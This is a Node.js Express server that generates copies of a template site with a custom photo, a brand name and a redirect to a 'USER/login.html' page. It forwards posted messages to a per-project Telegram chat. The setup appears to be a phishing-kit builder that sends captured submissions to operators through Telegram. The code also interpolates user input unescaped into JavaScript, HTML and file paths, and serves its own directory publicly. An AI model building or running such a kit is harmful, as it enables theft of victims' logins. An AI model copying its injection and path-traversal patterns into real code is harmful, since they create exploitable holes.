// Load environment variables from .env file
require('dotenv').config();

const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs-extra');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 8080;

// --- Directory Setup ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
const U_DIR = path.join(__dirname, 'U');
fs.ensureDirSync(UPLOADS_DIR);
fs.ensureDirSync(U_DIR);

// --- Middleware ---
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- Static File Serving ---
app.use('/uploads', express.static(UPLOADS_DIR));
app.use(express.static(__dirname));
app.use('/U', express.static(U_DIR));
app.use(express.static(path.join(__dirname, 'TEMPLATE')));

// --- Multer Setup for File Uploads ---
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, UPLOADS_DIR);
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + path.extname(file.originalname));
  }
});
const upload = multer({ storage: storage });

// --- Routes ---

// Generator page
app.get('/generator', (req, res) => {
  res.sendFile(path.join(__dirname, 'generator.html'));
});

// API endpoint for project generation
app.post('/api/generate', upload.single('photo'), async (req, res) => {
  const { projectName, chatId } = req.body;
  const photo = req.file;

  if (!projectName || !chatId || !photo) {
    return res.status(400).json({ error: 'All fields are required.' });
  }

  const randomFolderName = Math.random().toString(36).substring(2, 7);
  const newProjectPath = path.join(U_DIR, randomFolderName);
  const photoPath = `/uploads/${photo.filename}`;

  try {
    // 1. Copy TEMPLATE folder
    await fs.copy(path.join(__dirname, 'TEMPLATE'), newProjectPath);

    // 2. Update config.js
    const configPath = path.join(newProjectPath, 'JS', 'config.js');
    const configContent = `const TELEGRAM_CHAT_ID = "${chatId}";`;
    await fs.writeFile(configPath, configContent);

    // 3. Update index.html
    const indexPath = path.join(newProjectPath, 'index.html');
    let indexContent = await fs.readFile(indexPath, 'utf8');
    
    indexContent = indexContent.replace(/IMAGES\/IMG_0546\.jpeg/g, photoPath);
    indexContent = indexContent.replace(/window.location.href = 'USER\/login.html';/g, `window.location.href = 'USER/login.html?project=${randomFolderName}';`);
    indexContent = indexContent.replace(/<h1 class="text-\[28px\] font-semibold tracking-\[0.08em\] uppercase text-white leading-none">AMBASSADOR<\/h1>/g, `<h1 class="text-[28px] font-semibold tracking-[0.08em] uppercase text-white leading-none">${projectName}</h1>`);
    indexContent = indexContent.replace(/<span class="bg-white rounded-full px-5 py-\[7px\] text-\[13px\] font-medium text-gray-900 shadow-\[0_2px_12px_rgba\(0,0,0,0.10\)\] tracking-\[0.01em\]">\s*AMBASSADOR\s*<\/span>/g, `<span class="bg-white rounded-full px-5 py-[7px] text-[13px] font-medium text-gray-900 shadow-[0_2px_12px_rgba(0,0,0,0.10)] tracking-[0.01em]">${projectName}</span>`);
    
    indexContent = indexContent.replace('</body>', `<script>window.PROJECT_NAME = "${randomFolderName}";</script></body>`);
    
    await fs.writeFile(indexPath, indexContent);

    const fullUrl = `${req.protocol}://${req.get('host')}/U/${randomFolderName}`;
    res.status(200).json({ success: true, url: fullUrl });

  } catch (error) {
    console.error('Error generating project:', error);
    res.status(500).json({ error: 'Failed to generate project.' });
  }
});

// API endpoint for sending Telegram messages
app.post('/api/send-telegram', async (req, res) => {
    const { message, projectName } = req.body;
    console.log(`\n--- TELEGRAM SEND PROCESS ---`);
    console.log(`[1/7] Received request. Project Name: '${projectName}'`);

    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    let chatId;

    if (!projectName) {
        console.log(`[FAIL] Project Name is empty. Aborting.`);
        return res.status(400).json({ error: 'Project Name is missing' });
    }

    const configPath = path.join(U_DIR, projectName, 'JS', 'config.js');
    console.log(`[2/7] Constructed config path: ${configPath}`);

    try {
        const configContent = await fs.readFile(configPath, 'utf8');
        console.log(`[3/7] Successfully read config file content:\n---\n${configContent.trim()}\n---`);

        const match = configContent.match(/TELEGRAM_CHAT_ID\s*=\s*["'](.+?)["']/);
        console.log(`[4/7] Regex match result:`, match);

        if (match && match[1]) {
            chatId = match[1];
            console.log(`[5/7] Extracted Chat ID: '${chatId}'`);
        } else {
            console.log(`[FAIL] Could not extract Chat ID from config file.`);
        }
    } catch (error) {
        console.log(`[FAIL] Error reading config file:`, error);
        return res.status(500).json({ error: 'Could not read project configuration' });
    }

    if (!chatId) {
        console.log(`[FAIL] Chat ID is missing after processing. Aborting.`);
        return res.status(400).json({ error: 'Chat ID not found for project' });
    }

    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    console.log(`[6/7] Preparing to send message to Telegram API for Chat ID: '${chatId}'`);

    try {
        await axios.post(telegramApiUrl, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log(`[7/7] Successfully sent message to Telegram.`);
        res.status(200).json({ success: true });
    } catch (error) {
        const errorMessage = error.response ? error.response.data : error.message;
        console.log(`[FAIL] Error sending message to Telegram:`, errorMessage);
        res.status(500).json({ error: 'Failed to send message to Telegram', details: errorMessage });
    }
    console.log(`--- END TELEGRAM SEND PROCESS ---\n`);
});


// --- Server Start ---
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});